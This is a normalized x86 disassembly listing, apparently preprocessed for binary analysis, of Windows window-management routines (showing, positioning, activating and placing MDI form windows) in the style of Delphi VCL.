mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ rw-data ]
call sub_3acc8e4
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_3acc8e4
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_3ac8740
jmp r-xdata
sub_3acae39
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3acf68c
call sub_3a64cb0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_3acc8d8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3aaf4fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_3acc8cc
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3aaf540
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x7
jne r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
cmp ebx eax
jge r-xdata
adc esi 0x0
adc esi 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ rw-data ]
call sub_3acc8e4
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
mov ebx eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_3acc908
mov ebx eax
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3aaf4fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_3acc8d8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_3acc8e4
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acb3c7
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x273 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_3aafe18
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call __imp_SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3aaf540
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_3acc8cc
mov esi eax
mov eax [ ebp - 0x4 ]
sub esi [ eax + 0x4c ]
sar esi 0x1
jns r-xdata
adc ebx 0x0
mov eax esi
call sub_3ac6950
mov ebx eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ac8740
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call SendMessageA
jmp r-xdata
sub ebx eax
mov eax [ rw-data ]
call sub_3acc8fc
mov esi eax
sar esi 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_3acc8f0
cmp ebx eax
jge r-xdata
adc esi 0x0
jmp r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
cmp ebx eax
jge r-xdata
adc esi 0x0
add ebx eax
mov eax esi
call sub_3ac6970
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
mov eax [ rw-data ]
call sub_3acc8e4
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc esi 0x0
mov eax [ rw-data ]
call sub_3acc8e4
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
mov ebx eax
mov eax [ rw-data ]
call sub_3acc8e4
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
call sub_3acc8f0
mov ebx eax
add eax edx
mov esi eax
jmp r-xdata
adc edx 0x0
sub esi eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ rw-data ]
call sub_3acc8e4
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_3acc8e4
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_3ac8740
jmp r-xdata
sub_3acb297
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3acf68c
call sub_3a64cb0
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ac9ab4
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acb3c7
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
call sub_3ac4004
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ShowWindow
jmp r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
call sub_3ac432c
mov ebx eax
sub_3acb414
push ebx
mov ebx eax
mov eax ebx
call sub_3ab905c
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call __imp_SendMessageA
sub_3acb46c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8904c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3acb4ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_3acb4d8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffa5
call sub_3a6457c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3acb504
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x358 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
mov [ ebx + 0x294 ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x270 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_3acf61c
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffad
call sub_3a6457c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_3acb6a4
jmp r-xdata
mov eax ebx
call sub_3acb780
mov dl 0x1
mov eax ebx
call sub_3ac8700
jmp r-xdata
sub_3acb5a8
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x2e2 ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_3ac7e74
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_3ac7ec0
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
sub_3acb60c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3acb679
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf4 ]
test al al
je r-xdata
movzx eax [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_3a6457c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x294 ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3acb780
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3acb6c4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3acb743
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x276 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acb74a
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
mov eax ebx
call sub_3ab7fd8
test al al
jne r-xdata
mov eax ebx
call sub_3ac9988
sub_3acb750
push ebx
mov ebx eax
mov [ ebx + 0x344 ] edx
xor eax eax
mov [ ebx + 0x340 ] eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
call sub_3ab472c
pop ebx
retn
mov eax ebx
call sub_3ab4518
pop ebx
retn
sub_3acb79c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3acba8e
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_3aae0ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_3acdfa4
xor edx edx
push ebp
push sub_3acba71
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x330 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call __imp_SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x8
jne r-xdata
call GetActiveWindow
mov [ ebp - 0x1c ] eax
call sub_3ac4024
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_3a7a510
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
movzx eax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_3acce44
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_3ac41cc
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_3acba4f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_3acb6ac
xor edx edx
push ebp
push sub_3acb9ae
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x294 ] edx
mov eax [ rw-data ]
cmp [ eax + 0xd4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x294 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x294 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab4518
mov eax [ ebp - 0x4 ]
call sub_3ab7c14
call GetCapture
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x294 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3acb60c
mov eax [ rw-data ]
call sub_3acf2c8
mov eax [ rw-data ]
cmp [ eax + 0xa4 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acb9b5
mov eax [ ebp - 0x4 ]
call sub_3acb6a4
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_3acb9b5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acba59
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_3acce44
movzx edx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_3acce44
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_3a7a48c
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_3a7a630
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_3ac4290
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
call sub_3ac402c
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_3acbaa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3acbaa0
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_3acbb10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov esi [ ebx + 0x290 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_3acbaa0
pop ecx
mov eax [ esi + 0x34 ]
call sub_3aa6694
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x290 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_3aa66a4
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_3acbb78
push ebx
add esp 0xffffffd4
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
add esp 0x2c
pop ebx
retn
mov [ esp ] 0x2c
push esp
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowPlacement
mov eax [ esp + 0x8 ]
sub eax 0x2
je r-xdata
mov [ ebx + 0x273 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov [ ebx + 0x273 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x273 ] 0x0
sub_3acbbec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab5da4
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_3acbc0c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_3a6457c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_3acbc3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3acbc0c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3acbc3c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3acbcb8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x268 ]
call sub_3acbc0c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_3acbc0c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_3acbc3c
pop ecx
test al al
je r-xdata
sub_3acbd0c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_3a6457c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_3acbd3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3acbd0c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3acbd3c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3acbdb8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x268 ]
call sub_3acbd0c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_3acbd0c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_3acbd3c
pop ecx
test al al
je r-xdata
sub_3acbe0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_3a83ca4
mov esi eax
dec esi
test esi esi
jl r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
xor edi edi
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3acbe0c
pop ecx
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_3ac08c0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3a83c78
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3acbe88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
cmp [ ebx + 0x30a ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
mov al 0x1
mov edi [ ebx + 0x290 ]
test edi edi
je r-xdata
push ebp
mov eax ebx
call sub_3acbe0c
pop ecx
test al al
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffee
call sub_3a6457c
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3acbf00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x298 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_3a83e10
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x298 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_3acbf3c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x26c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab00f4
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_3ab0e78
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3acbf84
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x328 ] 0x0
jne r-xdata
